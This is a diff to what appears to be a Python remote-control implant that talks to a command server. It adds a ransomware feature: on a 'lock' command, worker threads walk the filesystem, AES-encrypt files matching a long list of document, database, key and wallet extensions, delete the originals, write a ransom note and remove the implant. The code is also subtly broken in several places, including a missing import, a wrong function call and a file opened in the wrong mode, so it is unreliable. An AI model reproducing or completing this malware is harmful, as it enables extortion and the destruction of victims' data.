@@ -5,6 +5,9 @@ import hashlib
 import os
 import sys
 import uuid
+import threading
+import queue
+from Crypto.Cipher import AES
 
 import requests
 
@@ -23,6 +26,8 @@ import base64
 password = "password"
 HOST, PORT = "0.0.0.0", 9998
 debug = True
+
+
 
 c2_id = 0
 
@@ -73,7 +78,7 @@ def handle(data):
 	integrity = data[3]
 
 	if verify(key, command, parameters, integrity):
-		stdout = run_builtin(command)
+		stdout = run_builtin(command, parameters)
 		if stdout == "BUILTIN":
 			stdout = run_command(command, parameters)
 	else:
@@ -143,7 +148,7 @@ def generate_id():
 	c2_id = uuid.uuid4().int
 
 
-def run_builtin(command):
+def run_builtin(command, parameters):
 	"""
 	Run builtin command, not local terminal
 	Args:
@@ -162,6 +167,13 @@ def run_builtin(command):
 		return str(os.getpid())
 	elif command == "usr":
 		return os.getlogin()
+	elif command == "lock":
+		
+		# Removes self if succesful 
+		if execute_ransom(parameters):
+			presence("KILL")
+		else:
+			return "LOCK FAILED"
 	else:
 		return "BUILTIN"
 
@@ -231,6 +243,95 @@ def upgrade_shell():
 		os.setuid(uid)
 	except (PermissionError, AttributeError):
 		pass
+
+
+def select_files(start, q):
+	"""Walk through directory, add all files to queue
+
+	Arguments:
+		start -- Start point for walk 
+
+	Returns:
+		queue containing all file names
+	"""
+	q = queue.Queue()
+	EXTS = ('.txt','.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', '.csv', '.d3dbsp', '.sc2save', '.sie', '.sum', '.ibank', '.t13', '.t12', '.qdf', '.gdb', '.tax', '.pkpass', '.bc6', '.bc7', '.bkp', '.qic', '.bkf', '.sidn', '.sidd', '.mddata', '.itl', '.itdb', '.icxs', '.hvpl', '.hplg', '.hkdb', '.mdbackup', '.syncdb', '.gho', '.cas', '.svg', '.map', '.wmo', '.itm', '.sb', '.fos', '.mcgame', '.vdf', '.ztmp', '.sis', '.sid', '.ncf', '.menu', '.layout', '.dmp', '.blob', '.esm', '.001', '.vtf', '.dazip', '.fpk', '.mlx', '.kf', '.iwd', '.vpk', '.tor', '.psk', '.rim', '.w3x', '.fsh', '.ntl', '.arch00', '.lvl', '.snx', '.cfr', '.ff', '.vpp_pc', '.lrf', '.m2', '.mcmeta', '.vfs0', '.mpqge', '.kdb', '.db0', '.mp3', '.upx', '.rofl', '.hkx', '.bar', '.upk', '.das', '.iwi', '.litemod', '.asset', '.forge', '.ltx', '.bsa', '.apk', '.re4', '.sav', '.lbf', '.slm', '.bik', '.epk', '.rgss3a', '.pak', '.big', '.unity3d', '.wotreplay', '.xxx', '.desc', '.py', '.m3u', '.flv', '.js', '.css', '.rb', '.png', '.jpeg', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt', '.cer', '.der', '.x3f', '.srw', '.pef', '.ptx', '.r3d', '.rw2', '.rwl', '.raw', '.raf', '.orf', '.nrw', '.mrwref', '.mef', '.erf', '.kdc', '.dcr', '.cr2', '.crw', '.bay', '.sr2', '.srf', '.arw', '.3fr', '.dng', '.jpeg', '.jpg', '.cdr', '.indd', '.ai', '.eps', '.pdf', '.pdd', '.psd', '.dbfv', '.mdf', '.wb2', '.rtf', '.wpd', '.dxg', '.xf', '.dwg', '.pst', '.accdb', '.mdb', '.pptm', '.pptx', '.ppt', '.xlk', '.xlsb', '.xlsm', '.xlsx', '.xls', '.wps', '.docm', '.docx', '.doc', '.odb', '.odc', '.odm', '.odp', '.ods', '.odt', '.sql', '.zip', '.tar', '.tar.gz', '.tgz', '.biz', '.ocx', '.html', '.htm', '.3gp', '.srt', '.cpp', '.mid', '.mkv', '.mov', '.asf', '.mpeg', '.vob', '.mpg', '.fla', '.swf', '.wav', '.qcow2', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.tar.bz2', '.tbk', '.bak', '.djv', '.djvu', '.bmp', '.cgm', '.tif', '.tiff', '.NEF', '.cmd', '.class', '.jar', '.java', '.asp', '.brd', '.sch', '.dch', '.dip', '.vbs', '.asm', '.pas', '.ldf', '.ibd', '.MYI', '.MYD', '.frm', '.dbf', '.SQLITEDB', '.SQLITE3', '.asc', '.lay6', '.lay', '.ms11 (Security copy)', '.sldm', '.sldx', '.ppsm', '.ppsx', '.ppam', '.docb', '.mml', '.sxm', '.otg', '.slk', '.xlw', '.xlt', '.xlm', '.xlc', '.dif', '.stc', '.sxc', '.ots', '.ods', '.hwp', '.dotm', '.dotx', '.docm', '.DOT', '.max', '.xml', '.uot', '.stw', '.sxw', '.ott', '.csr', '.key', 'wallet.dat')
+	for root, _, files in os.walk(start):
+		for file in files:
+			if file.lower().endswith(EXTS):
+				q.put(os.path.join(root, file))
+	return q
+
+class Worker(threading.Thread):
+	def __init__(self, queue, key):
+		threading.Thread.__init__(self)
+		self.queue = queue
+		self.key = key
+
+	def run(self):
+		while True:
+			qItem = self.queue.get()
+			try:
+				self.encrypt(qItem, self.key)
+				with open(qItem, 'wb'):
+					pass
+				try:
+					os.remove(qItem)
+				except Exception as ex:
+					pass
+			except Exception as ex:
+				pass
+			self.queue.task_done()
+
+	def encrypt(self, filename, key):
+		chunk_size = 65536
+		outputFile = filename + '.locked'
+		filesize = str(os.path.getsize(filename)).zfill(16)
+		IV = ''
+		for i in range(16):
+			IV += chr(random.randint(0, 255))
+		encryptor = AES.new(key, AES.MODE_CBC, IV)
+		with open(filename, 'rb') as (infile):
+			with open(outputFile, 'wb') as (outfile):
+				outfile.write(filesize)
+				outfile.write(IV)
+				while True:
+					chunk = infile.read(chunk_size)
+					if len(chunk) == 0:
+						break
+					else:
+						if len(chunk) % 16 != 0:
+							chunk += ' ' * (16 - len(chunk) % 16)
+					outfile.write(encryptor.encrypt(chunk))
+
+def execute_ransom(key):
+	"""Execute threaded ransomware process
+
+	Arguments:
+		key -- secret key from server 
+
+	Returns:
+		Message for remote server
+	"""
+	try:
+		q = select_files()
+
+		for _ in range(4):
+			w = Worker(q, key)
+			w.setDaemon(True)
+			w.start()
+
+		q.join()
+
+		with open(f"{os.path.expanduser("~")}/ransom.txt") as f:
+			# TODO: ransom note technique here
+			f.write("NOTE")
+
+		return True
+	except Exception as e:
+		print(f"Failed with error {e}")
+		return False
+
 
 
 def become_silent():
